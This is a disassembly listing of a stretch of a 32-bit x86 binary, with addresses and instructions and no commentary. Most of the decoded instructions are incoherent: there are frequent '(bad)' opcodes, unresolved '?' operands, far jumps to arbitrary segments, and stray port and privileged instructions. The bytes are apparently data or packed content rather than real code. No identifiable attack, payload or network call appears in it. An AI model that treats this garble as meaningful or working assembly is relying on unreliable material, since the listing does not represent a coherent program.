  40fa33:	jp     0x40f9f4
  40fa35:	out    0xaa,eax
  40fa37:	imul   eax,DWORD PTR [edx-0x7b35dae4],0xffffff97
  40fa3e:	xor    cl,BYTE PTR [ebp+0x41]
  40fa41:	or     esp,ebx
  40fa43:	jae    0x40fa42
  40fa45:	clc    
  40fa46:	daa    
  40fa47:	inc    edi
  40fa48:	popf   
  40fa49:	scas   eax,DWORD PTR es:[edi]
  40fa4a:	mov    eax,0x71cb3358
  40fa4f:	and    eax,0x42d837b4
  40fa54:	mov    ds:0x81cea20b,al
  40fa59:	fstp   QWORD PTR [esp+ecx*2-0x1dd740ad]
  40fa60:	push   edi
  40fa61:	rcl    edx,cl
  40fa63:	jp     0x40fa8b
  40fa65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa66:	inc    esi
  40fa67:	and    ebp,DWORD PTR [ebx+ebp*1-0x43379863]
  40fa6e:	mov    BYTE PTR [edx],ah
  40fa70:	mov    BYTE PTR [edx-0x3cf9f88e],dh
  40fa76:	imul   esi,DWORD PTR [esp],0xe223bc8f
  40fa7d:	mov    edi,0x6d26a692
  40fa82:	mov    edx,ecx
  40fa84:	sbb    esi,DWORD PTR [ebp+0x32]
  40fa87:	fdiv   st(4),st
  40fa89:	inc    edx
  40fa8a:	jmp    0xdc70e679
  40fa8f:	jae    0x40fac7
  40fa91:	nop
  40fa92:	ret    
  40fa93:	fs ja  0x40faa9
  40fa96:	sar    DWORD PTR [esi-0x24446342],cl
  40fa9c:	pushf  
  40fa9d:	test   al,0x7
  40fa9f:	inc    ecx
  40faa0:	mov    BYTE PTR [ebx+0x34],cl
  40faa3:	std    
  40faa4:	addr16 cmc 
  40faa6:	xchg   eax,esp
  40faa8:	mov    ebx,0x1eea52bc
  40faad:	push   esi
  40faae:	arpl   WORD PTR [ebp+0xb],ax
  40fab1:	adc    DWORD PTR [ebx-0x1],esp
  40fab4:	mov    ch,0x6c
  40fab6:	mov    dl,0xff
  40fab8:	xor    eax,0x635d48bc
  40fabd:	ret    
  40fabe:	sub    cl,BYTE PTR [edi+0x45c4079a]
  40fac4:	loope  0x40fb0d
  40fac6:	mov    ch,0xcd
  40fac8:	sbb    eax,0x7a5e853b
  40facd:	xchg   edx,eax
  40face:	and    eax,0xe3aeff8
  40fad3:	push   0xec6b0956
  40fad8:	nop
  40fad9:	outs   dx,BYTE PTR ds:[esi]
  40fada:	lods   al,BYTE PTR ds:[esi]
  40fadb:	add    BYTE PTR [eax+0x1b],dl
  40fade:	pop    es
  40fadf:	je     0x40fa85
  40fae1:	or     eax,0x27e57434
  40fae6:	(bad)  
  40fae8:	mov    ds:0x25e77bdd,al
  40faed:	(bad)  
  40faee:	push   edi
  40faef:	(bad)  
  40faf0:	cmc    
  40faf1:	mov    BYTE PTR [eax-0x76857ce7],ch
  40faf7:	mov    gs,ecx
  40faf9:	jne    0x40fb40
  40fafb:	in     al,dx
  40fafc:	rcl    BYTE PTR [ecx+0x43e41ee],1
  40fb02:	enter  0x9602,0x96
  40fb06:	cwde   
  40fb07:	pop    eax
  40fb08:	and    al,0xaf
  40fb0a:	add    edi,DWORD PTR [edx]
  40fb0c:	pop    esi
  40fb0d:	lods   al,BYTE PTR ds:[esi]
  40fb0e:	and    DWORD PTR [ecx],esi
  40fb10:	loop   0x40facc
  40fb12:	imul   DWORD PTR [esi+0xd791c54]
  40fb18:	sbb    ah,bh
  40fb1a:	jg     0x40fb51
  40fb1c:	inc    esp
  40fb1d:	mov    ds:0x2eea1e19,eax
  40fb22:	pop    ds
  40fb23:	jne    0x40fac3
  40fb25:	mov    ah,0x63
  40fb27:	jb     0x40fba4
  40fb29:	mov    cl,0x6
  40fb2b:	mov    ch,0xed
  40fb2d:	sub    eax,0xe6aebf4f
  40fb32:	out    0x3f,eax
  40fb34:	push   es
  40fb35:	repz call 0x83a60df7
  40fb3b:	dec    eax
  40fb3c:	ret    
  40fb3d:	aad    0xcd
  40fb3f:	sub    edi,DWORD PTR [edx+0x4db5c70c]
  40fb45:	or     ah,ah
  40fb47:	pop    eax
  40fb48:	mov    gs,WORD PTR [ecx-0x44]
  40fb4b:	sbb    esi,DWORD PTR [ecx+0x49]
  40fb4e:	test   BYTE PTR [ecx+0x5d],dl
  40fb51:	aam    0x16
  40fb53:	xor    BYTE PTR [ecx-0x1cb6249f],0x90
  40fb5a:	jns    0x40fae3
  40fb5c:	loopne 0x40fbc9
  40fb5e:	inc    esp
  40fb5f:	addr16 and eax,0xe7ec7610
  40fb65:	js     0x40faef
  40fb67:	repz dec esi
  40fb69:	bound  eax,QWORD PTR [edi]
  40fb6b:	aad    0x47
  40fb6d:	jge    0x40fb03
  40fb6f:	sti    
  40fb70:	fidivr WORD PTR [ebx+0x4c]
  40fb73:	sub    eax,0x2b
  40fb76:	leave  
  40fb77:	sbb    esp,eax
  40fb79:	adc    BYTE PTR [ebp+0x37bd207e],0x80
  40fb80:	cwde   
  40fb81:	add    ah,al
  40fb83:	sub    BYTE PTR [esi],dl
  40fb85:	gs shl ebx,cl
  40fb88:	test   BYTE PTR [ecx],ah
  40fb8a:	int    0xec
  40fb8c:	ins    BYTE PTR es:[edi],dx
  40fb8d:	clc    
  40fb8e:	push   esp
  40fb8f:	mov    ds:0x6479a5f7,eax
  40fb94:	cli    
  40fb95:	inc    esp
  40fb96:	data16 sub al,0xd2
  40fb99:	test   DWORD PTR [ecx-0x20be6bd],edx
  40fb9f:	push   0xb
  40fba1:	cmp    eax,0xf1f0e281
  40fba6:	or     DWORD PTR [eax],ebp
  40fba8:	outs   dx,BYTE PTR ds:[esi]
  40fba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbaa:	inc    edi
  40fbab:	pushf  
  40fbac:	jg     0x40fbc3
  40fbae:	imul   ecx,esi,0x8a5cf2ac
  40fbb4:	mov    edx,DWORD PTR [esi-0x6fe0ccd4]
  40fbba:	imul   ebp,DWORD PTR [esi],0xffffff87
  40fbbd:	inc    esi
  40fbbe:	imul   edx,DWORD PTR [ecx],0x2506600
  40fbc4:	xor    esi,DWORD PTR [edx]
  40fbc6:	mov    dl,0xf8
  40fbc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbc9:	or     BYTE PTR [ebp-0x77],bh
  40fbcc:	add    dh,BYTE PTR [esi-0x63f26704]
  40fbd2:	jno    0x40fb99
  40fbd4:	inc    ecx
  40fbd5:	sub    ecx,DWORD PTR [edx+0x30]
  40fbd8:	fnstcw WORD PTR [esi+eax*8-0x410aee35]
  40fbdf:	icebp  
  40fbe0:	call   0x4edc:0x158abe76
  40fbe7:	out    dx,eax
  40fbe8:	cwde   
  40fbe9:	xchg   BYTE PTR [edi+eax*8],dl
  40fbec:	mov    edx,0xee91fd7
  40fbf1:	fadd   QWORD PTR ds:0xfd166ebc
  40fbf7:	outs   dx,DWORD PTR ds:[esi]
  40fbf8:	data16 fidivr DWORD PTR [edx+0x48edea83]
  40fbff:	or     edi,DWORD PTR [ecx]
  40fc01:	sahf   
  40fc02:	dec    edi
  40fc03:	jo     0x40fc5c
  40fc05:	xor    eax,0x441ac238
  40fc0a:	xlat   BYTE PTR ds:[ebx]
  40fc0b:	xchg   DWORD PTR [ebp+0x73],eax
  40fc0e:	das    
  40fc0f:	ins    DWORD PTR es:[edi],dx
  40fc10:	and    edx,edx
  40fc12:	or     al,0x43
  40fc14:	es mov ebx,0xb52e5172
  40fc1a:	das    
  40fc1b:	xchg   esi,eax
  40fc1c:	dec    edi
  40fc1d:	sub    al,0x35
  40fc1f:	hlt    
  40fc20:	xchg   ebp,eax
  40fc21:	or     BYTE PTR [edi-0x7cb42933],bl
  40fc27:	pop    ss
  40fc28:	xchg   edx,eax
  40fc29:	repz cmp al,0x81
  40fc2c:	scas   al,BYTE PTR es:[edi]
  40fc2d:	jo     0x40fc86
  40fc2f:	out    0xe,eax
  40fc31:	ins    BYTE PTR es:[edi],dx
  40fc32:	popf   
  40fc33:	jbe    0x40fbd9
  40fc35:	ret    0x2cb9
  40fc38:	adc    al,0x95
  40fc3a:	arpl   WORD PTR [esi+ebp*2+0x2e],sp
  40fc3e:	cmp    ebx,DWORD PTR [eax+0x6cfea13d]
  40fc44:	fiadd  DWORD PTR [eax-0x6c613f7e]
  40fc4a:	aad    0x72
  40fc4c:	test   al,0xbf
  40fc4e:	mov    WORD PTR [edi+0x2f],es
  40fc51:	add    al,BYTE PTR [edi+0x75]
  40fc54:	jmp    0x490a:0x5865879e
  40fc5b:	imul   ebp,DWORD PTR ds:0x6f968f2c,0x37
  40fc62:	js     0x40fbe4
  40fc64:	in     eax,dx
  40fc65:	cmp    BYTE PTR [edx+0x4a],ah
  40fc68:	repz adc DWORD PTR fs:[esi],0x4
  40fc6d:	mov    edi,0xe55d86d8
  40fc72:	in     al,dx
  40fc73:	fs aaa 
  40fc75:	dec    edx
  40fc76:	pop    es
  40fc77:	test   al,0xcc
  40fc79:	(bad)  
  40fc7a:	lods   eax,DWORD PTR ds:[esi]
  40fc7b:	mov    ecx,DWORD PTR [ebx+0x40]
  40fc7e:	or     BYTE PTR [ecx+ecx*8],bl
  40fc81:	mov    ah,BYTE PTR [ebp-0x42]
  40fc84:	pusha  
  40fc85:	dec    edx
  40fc86:	pop    ecx
  40fc87:	mov    cl,0xa5
  40fc89:	lea    eax,ds:0x4a697d46
  40fc8f:	cmp    al,0x29
  40fc91:	cmp    cl,BYTE PTR [eax]
  40fc93:	mov    ss,WORD PTR [eax-0x775ee832]
  40fc99:	dec    ebp
  40fc9a:	inc    esp
  40fc9b:	mov    ebp,0xb2f360fa
  40fca0:	or     al,0x64
  40fca2:	jle    0x40fd1f
  40fca4:	aam    0xee
  40fca6:	shr    BYTE PTR [eax+edx*2+0x12],cl
  40fcaa:	or     BYTE PTR [edi+0x2021a44d],ah
  40fcb0:	jno    0x40fc9a
  40fcb2:	dec    esp
  40fcb3:	mov    ch,0x31
  40fcb5:	xor    al,ah
  40fcb7:	dec    ecx
  40fcb8:	sar    DWORD PTR [edi+0x448a5ec],cl
  40fcbe:	dec    edi
  40fcbf:	jne    0x40fd0c
  40fcc1:	adc    BYTE PTR [esi],dh
  40fcc3:	(bad)  
  40fcc4:	mov    bl,BYTE PTR [edx-0x6e]
  40fcc7:	mov    al,ds:0x9dc7087
  40fccc:	mov    ds:0x3f103b7,eax
  40fcd1:	shr    ecx,0xca
  40fcd4:	add    al,BYTE PTR [eax]
  40fcd6:	add    al,dh
  40fcd8:	sub    DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	shl    ebx,0x9
  40fce5:	fstp   TBYTE PTR es:[ecx-0x5381814d]
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fcc5
  40fcf0:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcf2:	xor    BYTE PTR [eax-0x6b],0x16
  40fcf6:	test   eax,0xb211b241
  40fcfb:	mov    ah,0xda
  40fcfd:	add    al,0x91
  40fcff:	hlt    
  40fd00:	dec    ebx
  40fd01:	adc    eax,DWORD PTR [ebp-0x1]
  40fd04:	jae    0x40fcec
  40fd06:	cdq    
  40fd07:	xor    ah,BYTE PTR [edx+0x3c036c36]
  40fd0d:	adc    ecx,0xffffff9a
  40fd10:	in     al,0x53
  40fd12:	or     bh,BYTE PTR [ebp+0x4c]
  40fd15:	call   0xe3e1:0x516b899
  40fd1c:	dec    ebp
  40fd1d:	mov    esi,0x22e896a9
  40fd22:	pop    ebx
  40fd23:	pop    esp
  40fd24:	cmc    
  40fd25:	sub    cl,al
  40fd27:	es cmp eax,0xd11298eb
  40fd2d:	jge    0x40fd39
  40fd2f:	cmp    dl,BYTE PTR [eax+0x2afa331d]
  40fd35:	int    0xc2
  40fd37:	dec    eax
  40fd38:	mov    ds:0x29bb8959,eax
  40fd3d:	ficomp WORD PTR [eax]
  40fd3f:	cmp    dh,ah
  40fd41:	sub    edi,DWORD PTR ds:0x8f71f6c4
  40fd47:	jo     0x40fd78
  40fd49:	stos   DWORD PTR es:[edi],eax
  40fd4a:	stos   BYTE PTR es:[edi],al
  40fd4b:	cmp    BYTE PTR [edi-0x134265dd],ah
  40fd51:	int3   
  40fd52:	push   ecx
  40fd53:	xchg   edi,eax
  40fd54:	mov    ch,0x5d
  40fd56:	mov    bl,0x71
  40fd58:	mov    edx,0x1ade3972
  40fd5d:	mov    esp,0xea1c3d0f
  40fd62:	iret   
  40fd63:	inc    esp
  40fd64:	push   0x2e
  40fd66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd67:	lock add BYTE PTR [ebp-0x1c941116],bl
  40fd6e:	pop    edx
  40fd6f:	call   0x5db50602
  40fd74:	lods   al,BYTE PTR ds:[esi]
  40fd75:	test   eax,0x493feee5
  40fd7a:	add    al,0x31
  40fd7c:	inc    ecx
  40fd7d:	retf   
  40fd7e:	loopne 0x40fdb2
  40fd80:	lahf   
  40fd81:	push   0xcf4df311
  40fd86:	and    DWORD PTR [eax],ebp
  40fd88:	nop
  40fd89:	dec    ebp
  40fd8a:	fnstenv cs:[esi]
  40fd8d:	inc    ebx
  40fd8e:	mov    ah,0x4d
  40fd90:	push   esi
  40fd91:	out    0x72,eax
  40fd93:	push   ebp
  40fd94:	jnp    0x40fd7c
  40fd96:	mov    dl,BYTE PTR [edi-0x7d731c6d]
  40fd9c:	scas   al,BYTE PTR es:[edi]
  40fd9d:	(bad)  
  40fd9e:	ja     0x40fde3
  40fda0:	nop
  40fda1:	push   ecx
  40fda2:	inc    edi
  40fda3:	inc    ebp
  40fda4:	outs   dx,BYTE PTR ds:[esi]
  40fda5:	add    BYTE PTR [ecx-0x121641e2],ch
  40fdab:	mov    esp,0x8dfaa563
  40fdb0:	sub    esp,DWORD PTR [ebp-0x52]
  40fdb3:	cs sbb eax,0xd660b141
  40fdb9:	lea    eax,[ebp-0x750f08f3]
  40fdbf:	not    BYTE PTR [edx-0x3a66997b]
  40fdc5:	out    dx,al
  40fdc6:	sub    ch,BYTE PTR [eax]
  40fdc8:	xchg   esp,eax
  40fdc9:	sbb    eax,0xf0b4e4dd
  40fdce:	jb     0x40fde7
  40fdd0:	cwde   
  40fdd1:	fmul   DWORD PTR [ebx-0x4d]
  40fdd4:	dec    esi
  40fdd5:	inc    ecx
  40fdd6:	outs   dx,BYTE PTR cs:[esi]
  40fdd8:	push   ss
  40fdd9:	stos   BYTE PTR es:[edi],al
  40fdda:	jg     0x40fe26
  40fddc:	xlat   BYTE PTR ds:[ebx]
  40fddd:	jnp    0x40fde8
  40fddf:	pop    edx
  40fde0:	inc    edx
  40fde1:	sub    edx,DWORD PTR [edx]
  40fde3:	inc    ecx
  40fde4:	or     dl,BYTE PTR [esi+ebp*1-0x79072e0]
  40fdeb:	push   es
  40fdec:	lods   eax,DWORD PTR ds:[esi]
  40fded:	ror    BYTE PTR [ebx],cl
  40fdef:	les    eax,FWORD PTR [edx+0x5078ba7b]
  40fdf5:	inc    ebx
  40fdf6:	inc    edx
  40fdf7:	rcl    DWORD PTR [ebx+0x6f4c5d33],0xf1
  40fdfe:	and    bh,BYTE PTR [ecx-0x66]
  40fe01:	scas   eax,DWORD PTR es:[edi]
  40fe02:	enter  0x8bb4,0xa4
  40fe06:	int3   
  40fe07:	frndint 
  40fe09:	mov    ecx,0xdd56171f
  40fe0e:	mov    BYTE PTR [edx+0x9f7ad5f],ch
  40fe14:	mov    ebx,ebx
  40fe16:	fst    st(1)
  40fe18:	sub    eax,DWORD PTR [eax+0x79]
  40fe1b:	mov    gs,WORD PTR [edx+0x39]
  40fe1e:	or     ch,ch
  40fe20:	test   eax,0x80d9cdd4
  40fe25:	outs   dx,DWORD PTR ds:[esi]
  40fe26:	cmp    al,0x68
  40fe28:	jae    0x40fe1f
  40fe2a:	jg     0x40fe20
  40fe2c:	sbb    bl,BYTE PTR [ebx-0x4d]
  40fe2f:	aaa    
  40fe30:	push   esp
  40fe31:	retf   
  40fe32:	sub    BYTE PTR [edi],bh
  40fe34:	jmp    0xe1a9:0x85164ce3
  40fe3b:	pop    ebp
  40fe3c:	xchg   esi,eax
  40fe3d:	mov    WORD PTR [ebx+0x710fec01],?
  40fe43:	jl     0x40fe90
  40fe45:	in     eax,dx
  40fe46:	stos   BYTE PTR es:[edi],al
  40fe47:	and    al,BYTE PTR [eax+0x5bb5e229]
  40fe4d:	mov    ?,WORD PTR [esi+0x3f7c1121]
  40fe53:	jne    0x40fe76
  40fe55:	sub    edi,ebx
  40fe57:	test   al,0x25
  40fe59:	mov    ebp,DWORD PTR [ebx]
  40fe5b:	cdq    
  40fe5c:	mov    ds:0xd8789601,al
  40fe61:	push   eax
  40fe62:	xchg   DWORD PTR [eax-0x2d1810ae],eax
  40fe68:	pop    ebx
  40fe69:	ret    
  40fe6a:	out    0x7b,eax
  40fe6c:	cdq    
  40fe6d:	cdq    
  40fe6e:	pop    edi
  40fe6f:	inc    ecx
  40fe70:	mov    esp,0xbb8590e4
  40fe75:	push   eax
  40fe76:	xchg   edx,eax
  40fe77:	fiadd  WORD PTR [ebp+eax*4-0x43b6e033]
  40fe7e:	add    eax,0x7ef09df8
  40fe83:	jnp    0x40fe60
  40fe85:	js     0x40fe91
  40fe87:	mov    ebx,0x33de4cee
  40fe8c:	and    esp,DWORD PTR ds:0x196722d3
  40fe92:	xor    ah,dh
  40fe94:	dec    ecx
  40fe95:	push   0x3851bc03
  40fe9a:	sbb    DWORD PTR [eax-0x3a4ad72e],esp
  40fea0:	or     al,0x78
  40fea2:	sub    eax,0x9ba40e86
  40fea7:	out    dx,al
  40fea8:	dec    eax
  40fea9:	xor    ebx,eax
  40feab:	shl    DWORD PTR [edx],1
  40fead:	jle    0x40fe75
  40feaf:	inc    ebx
  40feb0:	or     cl,ch
  40feb2:	fisttp QWORD PTR [esi+0x22772070]
  40feb8:	cmp    al,0x85
  40feba:	sahf   
  40febb:	mov    BYTE PTR [esi],0x83
  40febe:	aad    0x10
  40fec0:	jae    0x40fec1
  40fec2:	xchg   esp,eax
  40fec3:	inc    eax
  40fec4:	adc    DWORD PTR [ebx+0x49f3dd81],edi
  40feca:	mov    ebp,0x5a99fce4
  40fecf:	lock sar BYTE PTR [edi+eax*8-0x2e],1
  40fed4:	inc    ebx
  40fed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fed6:	push   esi
  40fed7:	rcr    DWORD PTR [edx+0x2f],0x20
  40fedb:	adc    ebx,edi
  40fedd:	shl    BYTE PTR [edx+ebx*2+0x4c],cl
  40fee1:	mov    edi,0x4e5147fd
  40fee6:	gs int 0xf3
  40fee9:	faddp  st(7),st
  40feeb:	adc    dh,BYTE PTR [edi+0x11]
  40feee:	lock and eax,0xf62c266c
  40fef4:	fbld   TBYTE PTR [edx+0x6a182045]
  40fefa:	push   es
  40fefb:	adc    al,0x88
  40fefd:	or     dh,ah
  40feff:	push   0xf61d080
  40ff04:	mov    esi,0xc441e953
  40ff09:	push   esi
  40ff0a:	gs aad 0xad
  40ff0d:	pushf  
  40ff0e:	stc    
  40ff0f:	cwde   
  40ff10:	jbe    0x40ff03
  40ff12:	les    esi,FWORD PTR [ebx-0x14]
  40ff15:	jo     0x40ff4c
  40ff17:	aad    0x4f
  40ff19:	jp     0x40ff97
  40ff1b:	inc    esp
  40ff1c:	ins    DWORD PTR es:[edi],dx
  40ff1d:	test   al,0x1c
  40ff1f:	adc    al,0xd5
  40ff21:	sub    DWORD PTR [esi+0x18619cc2],ebp
  40ff27:	cpuid  
  40ff29:	sub    esi,DWORD PTR [ecx+0x38baf66c]
  40ff2f:	test   BYTE PTR [ecx+0x4977096e],0x2d
  40ff36:	add    bh,cl
  40ff38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff39:	cmp    DWORD PTR [edx],ebp
  40ff3b:	mov    ecx,0x66114c27
  40ff40:	xchg   ebx,eax
  40ff41:	test   al,0xa8
  40ff43:	int3   
  40ff44:	retf   0xa68b
  40ff47:	mov    esi,cs
  40ff49:	sub    dl,al
  40ff4b:	out    dx,eax
  40ff4c:	push   esi
  40ff4d:	cdq    
  40ff4e:	stos   DWORD PTR es:[edi],eax
  40ff4f:	pop    ebx
  40ff50:	inc    ecx
  40ff51:	push   es
  40ff52:	jl     0x40ffbb
  40ff54:	lods   al,BYTE PTR ds:[esi]
  40ff55:	(bad)  
  40ff56:	int3   
  40ff57:	mov    al,0x10
  40ff59:	mov    ecx,0xe0a38fa0
  40ff5e:	adc    BYTE PTR [edi],dl
  40ff60:	adc    DWORD PTR [ecx-0x71],esp
  40ff63:	es adc al,0x27
  40ff66:	nop
  40ff67:	cmp    ebp,DWORD PTR [ebp+0x2d]
  40ff6a:	ss mov eax,0xc1675e6d
  40ff70:	mov    dh,0x7c
  40ff72:	inc    esi
  40ff73:	xchg   DWORD PTR ds:0xb23b18de,edx
  40ff79:	adc    eax,0x8f60e034
  40ff7e:	dec    ebp
  40ff7f:	mov    bl,0x2
  40ff81:	jmp    0x40ffb0
  40ff83:	outs   dx,DWORD PTR ds:[esi]
  40ff84:	push   esp
  40ff85:	ret    
  40ff86:	fist   WORD PTR [ebp-0x5c]
  40ff89:	or     al,0x9e
  40ff8b:	jae    0x40ffbb
  40ff8d:	xor    eax,0xbe033582
  40ff92:	dec    ebp
  40ff93:	in     al,dx
  40ff94:	xchg   ebp,eax
  40ff95:	push   ss
  40ff96:	neg    ecx
  40ff98:	int3   
  40ff99:	test   DWORD PTR [ecx],ecx
  40ff9b:	or     al,0x3d
  40ff9d:	inc    ebp
  40ff9e:	je     0x40ff72
  40ffa0:	cmc    
  40ffa1:	imul   eax,esi
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x433723,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x4337e7,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0xabd639b1
  40ffd9:	hlt    
  40ffda:	jb     0x40ffd3
  40ffdc:	mov    esi,0x7cac7e7e
  40ffe1:	jle    0x410061
  40ffe3:	sub    al,0xb2
  40ffe5:	or     al,0x93
  40ffe7:	imul   edi,DWORD PTR [edx+0xb837ef9],0xa006d362
  40fff1:	adc    ecx,DWORD PTR [ecx]
  40fff3:	dec    ebp
  40fff4:	ins    BYTE PTR es:[edi],dx
  40fff5:	inc    ebp
  40fff6:	mov    esp,0x87b06791
  40fffb:	lods   eax,DWORD PTR ds:[esi]
  40fffc:	inc    ecx
  40fffd:	ds push edi
  40ffff:	jae    0x410062
  410001:	inc    eax
  410002:	xor    al,0x99
  410004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410005:	ja     0x410068
  410007:	dec    edx
  410008:	ss mov eax,esp
  41000b:	push   ecx
  41000c:	sbb    DWORD PTR [edi],0x77
  41000f:	out    dx,eax
  410010:	aam    0xf7
  410012:	dec    BYTE PTR [eax+0x4]
  410015:	cmp    ecx,DWORD PTR [esi-0x2d7cb25b]
  41001b:	push   ebx
  41001c:	inc    edx
  41001d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41001e:	xor    DWORD PTR [esi],ebp
  410020:	adc    DWORD PTR gs:[edx-0x51],0x1a3ac1ed
  410028:	pop    edx
  410029:	push   ds
  41002a:	push   esp
  41002b:	sub    ebp,edx
  41002d:	sbb    eax,0x622450ce
  410032:	mov    edi,0xf9d4d6d5
  410037:	fsubr  st,st(4)
  410039:	adc    ebx,DWORD PTR gs:[edx]
  41003c:	fmulp  st(1),st
  41003e:	xchg   ecx,eax
  41003f:	cmovns edx,DWORD PTR [eax]
  410042:	xchg   esp,eax
  410043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410044:	adc    ebx,DWORD PTR [ebp+0x13]
  410047:	sub    eax,DWORD PTR [eax+0x76]
  41004a:	repz or bl,BYTE PTR [ebx]
  41004d:	in     eax,0xce
  41004f:	jg     0x4100a2
  410051:	mov    dh,BYTE PTR [eax-0x4fa87ad9]
  410057:	cli    
  410058:	mov    bl,BYTE PTR [ebx+0xb]
  41005b:	fisub  DWORD PTR [ecx+0x204485d3]
  410061:	outs   dx,DWORD PTR ds:[esi]
  410062:	jmp    0x9e9f:0x8d3fa45e
  410069:	adc    DWORD PTR [ecx],edx
  41006b:	jns    0x40fff7
  41006d:	push   ds
  41006e:	outs   dx,BYTE PTR ds:[esi]
  41006f:	leave  
  410070:	xchg   ebp,eax
  410071:	jbe    0x4100ee
  410073:	sub    al,0xbd
  410075:	je     0x410086
  410077:	retf   0x7873
  41007a:	mov    ecx,DWORD PTR [ebx+esi*2+0x527db05e]
  410081:	les    esi,FWORD PTR [ebx+0x251225a4]
  410087:	aas    
  410088:	jge    0x410022
  41008a:	xor    eax,0x3695b8b8
  41008f:	adc    bl,BYTE PTR [ebp+0x2e]
  410092:	aam    0xd7
  410094:	inc    edi
  410095:	push   es
  410096:	sbb    BYTE PTR [edx+0x60712e79],cl
  41009c:	push   edi
  41009d:	and    eax,DWORD PTR [esi]
  41009f:	shl    DWORD PTR [ecx+0x4bfcf8a8],0x52
  4100a6:	mov    ecx,0x5ec430db
  4100ab:	stos   DWORD PTR es:[edi],eax
  4100ac:	cld    
  4100ad:	cmp    bl,bh
  4100af:	pcmpeqd mm2,mm1
  4100b2:	add    al,0xfc
  4100b4:	pop    ss
  4100b5:	and    eax,0x52917e2d
  4100ba:	scas   al,BYTE PTR es:[edi]
  4100bb:	add    al,0xe9
  4100bd:	test   eax,edx
  4100bf:	std    
  4100c0:	mov    eax,0xcecfc192
  4100c5:	lods   al,BYTE PTR ds:[esi]
  4100c6:	dec    eax
  4100c7:	je     0x41013e
  4100c9:	sahf   
  4100ca:	or     eax,0x4c2fa615
  4100cf:	fucomp st(7)
  4100d1:	xor    dh,BYTE PTR [ecx]
  4100d3:	pop    ecx
  4100d4:	xor    esp,DWORD PTR [edx+0x16]
  4100d7:	jmp    0xdebe558f
  4100dc:	sub    eax,0x70d087dc
  4100e1:	into   
  4100e2:	inc    eax
  4100e3:	mov    esp,0x2ec09d05
  4100e8:	pop    esp
  4100e9:	xor    al,0x18
  4100eb:	jmp    0x7861:0xb4e41246
  4100f2:	pop    esp
  4100f3:	rcl    DWORD PTR [ebp-0x1c],cl
  4100f6:	mov    ah,0x2
  4100f8:	lods   eax,DWORD PTR ds:[esi]
  4100f9:	ret    
  4100fa:	lea    edx,[edx-0x3a]
  4100fd:	retf   
  4100fe:	stos   BYTE PTR es:[edi],al
  4100ff:	out    dx,eax
  410100:	add    al,0x8e
  410102:	cwde   
  410103:	or     BYTE PTR [esi-0x525120ad],0xa1
  41010a:	test   al,0x42
  41010c:	add    esi,ebp
  41010e:	or     DWORD PTR [ecx-0x6f],edx
  410111:	jae    0x410102
  410113:	(bad)  
  410114:	jle    0x41015d
  410116:	std    
  410117:	mov    edx,0xbc9fcce5
  41011c:	jno    0x410184
  41011e:	sub    al,0x4a
  410120:	int3   
  410121:	shl    DWORD PTR ds:[ebp+edi*4-0x76],cl
  410126:	sub    al,0x86
  410128:	push   ss
  410129:	(bad)  
  41012a:	test   DWORD PTR ds:0x52ec4c58,0x389c4786
  410134:	(bad)  
  410135:	pop    ebp
  410136:	push   es
  410137:	xchg   ecx,eax
  410138:	add    eax,0xa2fc26f
  41013d:	inc    ecx
  41013e:	pop    esi
  41013f:	inc    ebp
  410140:	xor    ecx,DWORD PTR [bp-0x1a9c]
  410145:	ins    BYTE PTR es:[edi],dx
  410146:	aam    0x30
  410148:	mov    al,BYTE PTR [edx-0x46]
  41014b:	mov    eax,0x8c61c2be
  410150:	mov    bh,0x1e
  410152:	mov    ah,0x83
  410154:	sbb    eax,0xc9201d17
  410159:	mov    al,ds:0xbea95746
  41015e:	cli    
  41015f:	ja     0x41015c
  410161:	jmp    0x41015b
  410163:	or     bl,BYTE PTR [ebp+0x28]
  410166:	in     al,0x1
  410168:	cmp    esi,DWORD PTR es:[edi+esi*2]
  41016c:	mov    al,ds:0xde9afd52
  410171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410172:	mov    bh,0x78
  410174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410175:	mov    edx,0x31def7d0
  41017a:	pushf  
  41017b:	cmp    ch,bh
  41017d:	push   ebp
  41017e:	ins    DWORD PTR es:[edi],dx
  41017f:	jl     0x410149
  410181:	test   al,0x12
  410183:	mov    ecx,0x84c32dbe
  410188:	or     esi,esp
  41018a:	mov    al,ds:0xbd6c0ed7
  41018f:	or     eax,DWORD PTR [edi]
  410191:	scas   eax,DWORD PTR es:[edi]
  410192:	cwde   
  410193:	dec    esp
  410194:	mov    ?,WORD PTR [edi+0xb]
  410197:	jg     0x41012f
  410199:	inc    eax
  41019a:	out    dx,eax
  41019b:	xchg   ecx,eax
  41019c:	jns    0x41014e
  41019e:	xchg   edx,eax
  41019f:	aad    0xc
  4101a1:	adc    esi,DWORD PTR [ebp+0x11]
  4101a4:	stos   DWORD PTR es:[edi],eax
  4101a5:	imul   bl
  4101a7:	add    bl,bh
  4101a9:	cli    
  4101aa:	test   BYTE PTR [ebp+edi*4-0x2a57d7be],dh
  4101b1:	scas   al,BYTE PTR es:[edi]
  4101b2:	mov    esi,0x4362cb7d
  4101b7:	add    ch,BYTE PTR [ecx]
  4101b9:	pop    edi
